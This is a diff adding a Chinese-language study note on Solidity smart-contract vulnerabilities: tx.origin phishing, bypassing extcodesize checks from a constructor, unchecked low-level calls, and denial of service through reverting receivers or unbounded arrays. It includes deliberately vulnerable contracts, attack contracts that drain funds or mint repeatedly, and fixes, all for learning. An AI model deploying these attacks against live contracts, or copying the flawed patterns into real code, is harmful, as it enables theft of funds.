@@ -15,8 +15,257 @@ Beneath bright daylight skies, flowers bloom freely.
 ## Notes
 
 <!-- Content_START -->
+# 2026-07-16
+<!-- DAILY_CHECKIN_2026-07-16_START -->
+2026.7.16
+
+## `tx.origin`**钓鱼攻击**
+
+如果一个合约用`tx.origin`做身份验证，那么黑客就有可能先部署一个攻击合约，然后再诱导合约的拥有者调用，即使`msg.sender`是攻击合约地址，但`tx.origin`是银行合约拥有者地址，因此用`tx.origin`作身份验证较为危险
+
+**漏洞合约：**
+
+```
+ contract Bank {
+     address public owner;
+ ​
+     constructor() payable {
+         owner = msg.sender;
+     }
+ ​
+     function transfer(address payable _to, uint _amount) public {
+         //危险漏洞，tx.origin作身份验证可能被钓鱼攻击
+         require(tx.origin == owner, "Not owner");
+         //转账ETH
+         (bool sent, ) = _to.call{value: _amount}("");
+         require(sent, "Failed to send Ether");
+     }
+ }
+```
+
+**攻击合约**
+
+```
+ contract Attack {
+     // 受益者地址
+     address payable public hacker;
+     // Bank合约地址
+     Bank bank;
+ ​
+     constructor(Bank _bank) {
+         //强制将address类型的_bank转换为Bank类型
+         bank = Bank(_bank);
+         //将受益者地址赋值为部署者地址
+         hacker = payable(msg.sender);
+     }
+ ​
+     function attack() public {
+         //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
+         bank.transfer(hacker, address(bank).balance);
+     }
+ }
+```
+
+**预防：**
+
+使用`msg.sender`代替`tx.origin`
+
+```
+ function transfer(address payable _to, uint256 _amount) public {
+   require(msg.sender == owner, "Not owner");
+ ​
+   (bool sent, ) = _to.call{value: _amount}("");
+   require(sent, "Failed to send Ether");
+ }
+```
+
+或检测`tx.origin == msg.sender`
+
+```
+     function transfer(address payable _to, uint _amount) public {
+         require(tx.origin == owner, "Not owner");
+         require(tx.origin == msg.sender, "can't call by external contract");
+         (bool sent, ) = _to.call{value: _amount}("");
+         require(sent, "Failed to send Ether");
+     }
+```
+
+## **绕过合约长度检查**
+
+有一个判断调用者是外部账户（EOA）还是合约的方法，通过`extcodesize`获取该地址所储存的`bytecode`长度，若大于0，则判断为合约
+
+**例：**
+
+```
+ // 利用 extcodesize 检查是否为合约
+ function isContract(address account) public view returns (bool) {
+     // extcodesize > 0 的地址一定是合约地址
+     // 但是合约在构造函数时候 extcodesize 为0
+     uint size;
+     assembly {
+         size := extcodesize(account)
+     }
+     return size > 0;
+ }
+```
+
+但有个漏洞，合约未被完全创建的时候，`runtime bytcode`未被存储到地址上，此时`bytecode`也为0，所以我们将逻辑写在构造函数中（合约未被创建完成），也可以骗过这个函数`size = 0`
+
+**漏洞合约：**
+
+```
+ // 用extcodesize检查是否为合约地址
+ contract ContractCheck is ERC20 {
+     // 构造函数：初始化代币名称和代号
+     constructor() ERC20("", "") {}
+     
+     // 利用 extcodesize 检查是否为合约
+     function isContract(address account) public view returns (bool) {
+         // extcodesize > 0 的地址一定是合约地址
+         // 但是合约在构造函数时候 extcodesize 为0
+         uint size;
+         assembly {
+             size := extcodesize(account)
+         }
+         return size > 0;
+     }
+ ​
+     // mint函数，只有非合约地址能调用（有漏洞）
+     function mint() public {
+         require(!isContract(msg.sender), "Contract not allowed!");
+         _mint(msg.sender, 100);
+     }
+ }
+```
+
+**攻击合约：**
+
+```
+ // 利用构造函数的特点攻击
+ contract NotContract {
+     bool public isContract;
+     address public contractCheck;
+ ​
+     // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
+     constructor(address addr) {
+         contractCheck = addr;
+         isContract = ContractCheck(addr).isContract(address(this));
+         // This will work
+         for(uint i; i < 10; i++){
+             ContractCheck(addr).mint();
+         }
+     }
+ ​
+     // 合约创建好以后，extcodesize > 0，isContract() 可以检测
+     function mint() external {
+         ContractCheck(contractCheck).mint();
+     }
+ }
+```
+
+## **未检查的低级调用**
+
+solidity中，失败的低级调用不会让交易回滚
+
+### **低级调用**
+
+以太坊的低级调用：`call()`，`delegatecall()`，`staticcall()`，`send()`
+
+当他们出现异常时，并不会向上传递，不会导致交易完全回滚，只会返回一个布尔值`false`
+
+```
+ contract UncheckedBank {
+     mapping (address => uint256) public balanceOf;    // 余额mapping
+ ​
+     // 存入ether，并更新余额
+     function deposit() external payable {
+         balanceOf[msg.sender] += msg.value;
+     }
+ ​
+     // 提取msg.sender的全部ether
+     function withdraw() external {
+         // 获取余额
+         uint256 balance = balanceOf[msg.sender];
+         require(balance > 0, "Insufficient balance");
+         balanceOf[msg.sender] = 0;
+         // Unchecked low-level call
+         bool success = payable(msg.sender).send(balance);
+     }
+ ​
+     // 获取银行合约的余额
+     function getBalance() external view returns (uint256) {
+         return address(this).balance;
+     }
+ }
+```
+
+`withdraw()`函数的`.send`没有检查`success`，但如果用户无法接收转账，`withdraw()`却可以正常调用，余额清空但提款失败
+
+## **DoS攻击**
+
+**_\###_ 外部调用阻塞DoS**
+
+`transfer()`/`send()`仅支持2300 gas，若接收方恶意，`fallback()`/`receive()`内部主动revert，业务的循环遍历逻辑就会直接失败，所有用户都无法拿到资金，永久阻塞分发逻辑
+
+**漏洞合约：**
+
+```
+ // 危险：批量循环transfer
+ contract Dividend {
+     address[] public users;
+ ​
+     function distribute() external {
+         // 遍历所有用户批量发分红
+         for(uint i=0; i<users.length; i++){
+             // 恶意合约接收时直接revert，整轮循环中断
+             payable(users[i]).transfer(1 ether);
+         }
+     }
+ }
+```
+
+**解决方案：**
+
+1.  pull取款模式，合约不主动转账，用户自行调用`withdraw()`提取资金
+    
+2.  使用低gas兼容的`call{value: amount}("")`，捕获失败，跳过恶意地址
+    
+
+### **循环数组遍历Gas爆炸DoS**
+
+合约数组无长度限制，攻击者大量填充数组，遍历数组时Gas超出区块Gas上限，交易失败
+
+```
+ contract Lottery {
+     address[] public players;
+ ​
+     // 无上限入队
+     function join() external payable {
+         players.push(msg.sender);
+     }
+ ​
+     // 开奖需要遍历全部玩家，数组过大直接Gas超限
+     function draw() external {
+         uint total = players.length;
+         for(uint i=0; i<total; i++){
+             // 复杂计算消耗大量gas
+         }
+     }
+ }
+```
+
+**解决方案：**
+
+1.  限制数组最大长度
+    
+2.  分页遍历，增加索引参数，单次只遍历一小段，分多笔交易完成遍历
+    
+3.  改用`mapping(address => bool)`存储，避免线性遍历
+<!-- DAILY_CHECKIN_2026-07-16_END -->
+
 # 2026-07-15
 <!-- DAILY_CHECKIN_2026-07-15_START -->
+
 2026.7.15
 
 ## **整数溢出**
@@ -75,6 +324,7 @@ uint256 加法溢出公式：a + b = (a + b) \\bmod 2^{256}
 
 # 2026-07-14
 <!-- DAILY_CHECKIN_2026-07-14_START -->
+
 
 2026.7.14
 
@@ -209,6 +459,7 @@ uint
 
 # 2026-07-08
 <!-- DAILY_CHECKIN_2026-07-08_START -->
+
 
 
 ## **7.8**
@@ -353,6 +604,7 @@ pure：既无法读取也无法修改
 
 # 2026-07-07
 <!-- DAILY_CHECKIN_2026-07-07_START -->
+
 
 
 
